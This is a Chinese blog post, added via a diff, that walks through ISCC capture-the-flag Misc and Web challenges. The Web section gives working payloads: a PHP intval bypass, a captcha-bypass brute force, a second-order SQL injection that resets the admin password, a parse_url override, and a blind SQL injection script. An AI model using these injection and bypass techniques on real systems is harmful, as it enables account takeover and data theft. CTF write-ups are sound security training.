@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>ISCC Web MIsc题解 | Iuhrey的幻想乡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言这次打ISCC算是刷下题目，顺便混一个奖吧，写这篇博客把iscc一些题目题解记录一下。 Misc隐藏的信息首先8进制转10进制，再转字符，接着base64编码就出了flag，脚本如下:12345678910111213141516#coding=utf-8import base64str = &amp;quot;0126 062 0126 0163 0142 0103 0102 0153 0142 0">
+<meta name="keywords" content="比赛总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCC Web MIsc题解">
+<meta property="og:url" content="http://yoursite.com/2019/05/01/ISCC-Web题解/index.html">
+<meta property="og:site_name" content="Iuhrey的幻想乡">
+<meta property="og:description" content="前言这次打ISCC算是刷下题目，顺便混一个奖吧，写这篇博客把iscc一些题目题解记录一下。 Misc隐藏的信息首先8进制转10进制，再转字符，接着base64编码就出了flag，脚本如下:12345678910111213141516#coding=utf-8import base64str = &amp;quot;0126 062 0126 0163 0142 0103 0102 0153 0142 0">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/27/13.png">
+<meta property="og:image" content="http://yoursite.com/images/27/4.png">
+<meta property="og:image" content="http://yoursite.com/images/27/12.png">
+<meta property="og:image" content="http://yoursite.com/images/27/6.png">
+<meta property="og:image" content="http://yoursite.com/images/27/7.png">
+<meta property="og:image" content="http://yoursite.com/images/27/5.png">
+<meta property="og:image" content="http://yoursite.com/images/27/8.png">
+<meta property="og:image" content="http://yoursite.com/images/27/9.png">
+<meta property="og:image" content="http://yoursite.com/images/27/10.png">
+<meta property="og:image" content="http://yoursite.com/images/27/1.png">
+<meta property="og:image" content="http://yoursite.com/images/27/2.png">
+<meta property="og:image" content="http://yoursite.com/images/27/3.png">
+<meta property="og:image" content="http://yoursite.com/images/27/11.png">
+<meta property="og:image" content="http://yoursite.com/images/27/14.png">
+<meta property="og:image" content="http://yoursite.com/images/27/15.png">
+<meta property="og:updated_time" content="2019-05-25T01:30:36.802Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ISCC Web MIsc题解">
+<meta name="twitter:description" content="前言这次打ISCC算是刷下题目，顺便混一个奖吧，写这篇博客把iscc一些题目题解记录一下。 Misc隐藏的信息首先8进制转10进制，再转字符，接着base64编码就出了flag，脚本如下:12345678910111213141516#coding=utf-8import base64str = &amp;quot;0126 062 0126 0163 0142 0103 0102 0153 0142 0">
+<meta name="twitter:image" content="http://yoursite.com/images/27/13.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="source/images/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>32</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-ISCC-Web题解" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/01/ISCC-Web题解/" class="article-date">
+  <time class="post-time" datetime="2019-05-01T03:20:05.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ISCC Web MIsc题解
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次打ISCC算是刷下题目，顺便混一个奖吧，写这篇博客把iscc一些题目题解记录一下。</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h2><p>首先8进制转10进制，再转字符，接着base64编码就出了flag，脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">str = &quot;0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113&quot;</span><br><span class="line">str = str.split(&quot; &quot;)</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">def eight2ten(aaa):</span><br><span class="line">    handle = &quot;&quot;</span><br><span class="line">    if len(aaa) == 4:</span><br><span class="line">        handle = int(aaa[1])*64 + int(aaa[2])*8 + int(aaa[3])</span><br><span class="line">    if len(aaa) == 3:</span><br><span class="line">        handle = int(aaa[1]) * 8 + int(aaa[2])</span><br><span class="line">    return handle</span><br><span class="line">for i in range(len(str)):</span><br><span class="line">    str[i] = eight2ten(str[i])</span><br><span class="line">    flag = flag + chr(int(str[i]))</span><br><span class="line">print base64.b64decode(flag)</span><br></pre></td></tr></table></figure></p>
+<h2 id="最危险的地方就是最安全的地方"><a href="#最危险的地方就是最安全的地方" class="headerlink" title="最危险的地方就是最安全的地方"></a>最危险的地方就是最安全的地方</h2><p>拿到图片，binwalk分离之后，把最后一张图片丢到C32Asm找flag就行了</p>
+<h2 id="解密成绩单"><a href="#解密成绩单" class="headerlink" title="解密成绩单"></a>解密成绩单</h2><p>拿到zip可以想到是伪加密，找到第二个PK，修改之后的09为00解压可以得到一个exe文件，.NET反编译一下拿到password就能拿到flag了。</p>
+<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>emmm，先由繁化简，经过观察发现只有两种字符串构成的。分别替换为0和1，再通过二进制转字符得到flag。</p>
+<p><img src="/images/27/13.png" alt=""></p>
+<h2 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h2><p>这是一道隐写题，搞了一下发现是lsb，丢到stegsolve调一下，flag就出来了。</p>
+<p><img src="/images/27/4.png" alt=""></p>
+<p>交的时候还在想和倒立屋有啥关系，结果发现flag得倒着交才行。</p>
+<h2 id="无法运行的exe"><a href="#无法运行的exe" class="headerlink" title="无法运行的exe"></a>无法运行的exe</h2><p>拖进C32Asm发现是一串base64，解码发现头是png，但是不完整，补全头就能得到一个二维码。扫描之后就是flag了。</p>
+<p><img src="/images/27/12.png" alt=""></p>
+<h2 id="High起来"><a href="#High起来" class="headerlink" title="High起来"></a>High起来</h2><p>binwalk分离出一个mp3以及两个其他文件，把png丢进C32Asm看一眼发现头部有个PNG，可以想到尝试修复一下图片，之后得到一个二维码，扫描之后发现是当铺加密的一串字符串，解密之后得到一串数字，结合mp3可以想到使用MP3Stego进行解密，在txt文件中得到flag。</p>
+<h2 id="他们能在一起吗？"><a href="#他们能在一起吗？" class="headerlink" title="他们能在一起吗？"></a>他们能在一起吗？</h2><p>真是悲伤的一道题目，扫描二维码发现了PASS{0K_I_L0V3_Y0u!}<br>接着通过binwalk分离出了一个zip文件，用这个密码解压出的文件就是flag了。</p>
+<h2 id="Keyes’-secret"><a href="#Keyes’-secret" class="headerlink" title="Keyes’ secret"></a>Keyes’ secret</h2><p>照着键盘画接着找有关iscc的就行了。最后得出flag如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;ISCC KEYBOARD CIPHER&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Aesop’s-secret"><a href="#Aesop’s-secret" class="headerlink" title="Aesop’s secret"></a>Aesop’s secret</h2><p>打开文件发现是gif文件，用stegsolve查看一下该文件内容，发现有一串加密的字符。</p>
+<p><img src="/images/27/6.png" alt=""></p>
+<p>base64解密之后发现这是一个AES加密</p>
+<p><img src="/images/27/7.png" alt=""></p>
+<p>缺少一个key，怎么找呢？把所有的动图截取之后拼起来，得到如下图片：</p>
+<p><img src="/images/27/5.png" alt=""></p>
+<p>尝试把ISCC作为key二次解密之后得到flag。</p>
+<p><img src="/images/27/8.png" alt=""></p>
+<h2 id="碎纸机"><a href="#碎纸机" class="headerlink" title="碎纸机"></a>碎纸机</h2><p>首先把图片丢到C32Asm里面，看到尾部有readme.txt字样，想到是不是里面整合了几个文件，利用binwalk查看一下发现果然有，使用binwalk分离文件。</p>
+<p><img src="/images/27/9.png" alt=""></p>
+<p>得到十张图片以及一个readme.txt文件，不过图片都是一样的。</p>
+<p><img src="/images/27/10.png" alt=""></p>
+<p>把十张图丢到C32asm对比发现文件末尾不同，经过尝试之后发现把不同的像素点弄出来做成图拼接就行了。</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开界面可以看到</p>
+<p><img src="/images/27/1.png" alt=""></p>
+<p>第一个限制可以通过加256来绕过，因为chr是会经过mod256处理的，第二个限制用科学计数法来绕过，结合intval()函数的特性，他会在第一个字符处截断字符串，然后输出，例如输入2e4，第一个intval()会输出2，而第二个则是输出20001。最后payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=2e4</span><br></pre></td></tr></table></figure>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>点开题目可以看到一个粗略的登入页面</p>
+<p><img src="/images/27/2.png" alt=""></p>
+<p>一般这种爆破类型的题目，验证码一定有绕过的方式，测试发现这个验证码根据PHPSESSID生成，我们把PHPSESSID置换为空，验证码就为空了，接着爆破就行了。最后爆出结果如下：</p>
+<p><img src="/images/27/3.png" alt=""></p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>这是sqli-labs/Less24的原题，真是吃了做题少的亏了，这题目最关键的点就是这一句sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;</span><br></pre></td></tr></table></figure>
+<p>我们只需要注册admin’ #12313213，就能不需要原密码修改admin的密码了。此时的语句拼接成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos; #12313213&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<p>把admin修改一下，然后登入就能拿到flag了。</p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>源码如下：</p>
+<p><img src="/images/27/11.png" alt=""></p>
+<p>这题目关键点就是parse_url的变量覆盖。通过覆盖掉$hashed_key就行了。payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=auth&amp;key=a&amp;hashed_key=ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb</span><br></pre></td></tr></table></figure>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>这题目算是脑洞题了，首先提示我们不是Union.373内部成员。</p>
+<p><img src="/images/27/14.png" alt=""></p>
+<p>这里修改头就行了，发包之后可以看到下一个提示。</p>
+<p><img src="/images/27/15.png" alt=""></p>
+<p>按照要求传入用户名以及后续的密码，在测试的时候发现提示要我们拿到用户名密码，进行fuzz得知只是一个注入。通过不断fuzz，最终爆破出密码，这是脚本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://39.100.83.188:8054/&quot;</span><br><span class="line">header = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Union.373&quot;&#125;</span><br><span class="line">list = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(0,40):</span><br><span class="line">    for j in range(0,64):</span><br><span class="line">        temp = flag + list[j]</span><br><span class="line">        payload = &#123;&quot;username&quot;:&quot;union_373_Tom&apos; union select 1,&apos;0&apos;,&apos;%s&apos; order by 3,&apos;0&quot;%(temp),&quot;password&quot;:&quot;1&quot;&#125;</span><br><span class="line">        res = requests.post(url, data=payload,headers=header)</span><br><span class="line">        if &quot;union_373_Tom&quot; in res.content:</span><br><span class="line">            flag = flag + list[j-1]</span><br><span class="line">            break</span><br><span class="line">    print flag</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>这题目也是原题，我也是按照师傅的wp一步一步做的，就不造轮子了。<br>这是一叶飘零师傅写的wp—–<a href="https://paper.tuisec.win/detail/d7f831097c27268" target="_blank" rel="noopener">Json Web Token历险记</a>  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/05/01/ISCC-Web题解/" data-id="cjv4r4rxk000imcvjqfvkia6g" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛总结/">比赛总结</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/04/17/DDCTF-WEB部分wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">DDCTF WEB部分wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="comments">
+    <div id="uyan_frame"></div>
+  </div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Iuhrey的幻想乡</h1>
+    <h2 class="blog-subtitle">记录日常所学</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>32</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
+          喜欢啥几把BB的狗骑驴
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
+          喜欢gay在狗骑驴旁边的狗逼
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
+          gay里gay气的大黄
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
+          郁离歌大手子的博客
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
+          有很多小姐姐的烧包包
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=541131&auto=1&height=66"></iframe>
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2018 - 2019 Iuhrey<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
+      
+    </div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
